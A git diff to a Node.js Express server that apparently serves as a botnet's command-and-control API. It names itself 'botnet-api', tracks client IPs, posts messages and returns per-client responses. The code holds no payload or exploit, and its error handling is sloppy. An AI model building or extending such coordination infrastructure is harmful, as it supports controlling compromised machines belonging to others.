@@ -8,6 +8,7 @@ const PORT = process.env.PORT || 3000;
 const NODE_ENV = process.env.NODE_ENV || 'development';
 const ip = require('./ip.json');
 var messages = require('./messages.json');
+const responses = require('./responses.json');
 app.set('port', PORT);
 app.set('env', NODE_ENV);
 app.use(logger('tiny'));
@@ -31,7 +32,7 @@ app.get('/api/v1/messages', (req, res, next) => {
 });
 app.get('/api/v1/messages/:id', (req, res, next) => {
     try {
-        const playerStats = messages.find(player => player.id === Number(req.params.id));
+        const playerStats = messages.find(message => message.id === Number(req.params.id));
         if (!playerStats) {
             const err = new Error('message not found');
             err.status = 404;
@@ -51,7 +52,7 @@ app.post('/api/v1/ip', (req, res, next) => {
         };
         ip.push(newIP);
         var sip = JSON.stringify(ip);
-        fs.writeFileSync("ip.json",sip);
+        fs.writeFileSync("ip.json", sip);
         res.status(201).json(newIP);
     } catch (e) {
         next(e);
@@ -67,7 +68,7 @@ app.post('/api/v1/messages', (req, res, next) => {
         };
         messages.push(newMessage);
         var smessages = JSON.stringify(messages);
-        fs.writeFileSync("messages.json",smessages);
+        fs.writeFileSync("messages.json", smessages);
         res.status(201).json(newMessage);
     } catch (e) {
         next(e);
@@ -76,12 +77,52 @@ app.post('/api/v1/messages', (req, res, next) => {
 });
 app.delete('/api/v1/messages', (req, res, next) => {
     messages = [];
-    
+
     res.end();
 });
-app.get('/', function (req, res) {
-    res.send('hello world');
+app.get('/api', function (req, res) {
+    var json = {
+        uri: "http://botnet-api.glitch.me/",
+        version: 1,
+        port: PORT,
+        environment: NODE_ENV,
+        clients: ip.length,
+        messages: messages.length
+    }
+    res.json(json);
 
+    res.end();
+});
+app.get('/api/v1/responses/:ip/:id', (req, res, next) => {
+    var response;
+    try
+    {
+        const resp = responses.find(_resp => _resp.ip === String(req.params.ip));
+        if (!resp)
+        {
+            const err = new Error('ip not found');
+            err.status = 404;
+            throw err;
+        }
+        response = resp.responses;
+    }
+    catch (e)
+    {
+        next(e);
+    }
+    try {
+        const ressponse = response.find(_resp => _resp.id === Number(req.params.id))
+        if (!ressponse) {
+            const err = new Error('response not found');
+            err.status = 404;
+            throw err;
+        }
+        res.json(ressponse);
+    }
+    catch (e)
+    {
+        next(e);
+    }
     res.end();
 });
 app.use((req, res, next) => {
